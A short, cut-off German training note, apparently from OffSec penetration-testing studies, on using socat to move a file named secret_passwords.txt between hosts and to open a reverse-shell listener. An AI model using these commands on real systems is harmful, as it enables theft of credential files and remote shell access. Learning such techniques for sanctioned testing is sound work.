# OffSec - Socat 

## File Transfer

Listener mit #Socat auf dem Host öffnen, um Daten zu empfangen und in eine Datei zu schreiben 

`socat TCP4-LISTEN:443,fork file:secret_passwords.txt`

Auf dem Empfänger folgender Befehl:
`socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`

## Reverseshells

Mit #Socat können auch #Reverseshells eröffnet werden. 

Auf dem Host
```socat -d -d TCP4-LISTEN:443 STDOUT```

Auf dem